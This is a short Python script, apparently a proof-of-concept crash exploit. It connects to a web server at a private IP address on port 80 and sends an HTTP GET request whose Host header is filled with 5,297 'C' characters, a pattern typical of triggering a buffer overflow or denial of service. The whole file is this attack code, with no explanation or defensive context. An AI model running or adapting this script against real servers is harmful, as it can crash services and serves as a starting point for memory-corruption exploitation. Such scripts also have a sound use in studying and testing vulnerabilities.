import socket
import sys

host = "192.168.100.120"
port = 80

crash = "C" * 5297



req  = "GET / HTTP/1.1\r\n"
req += "Host: "+ crash + "\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Connection: close\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(req)
s.close()


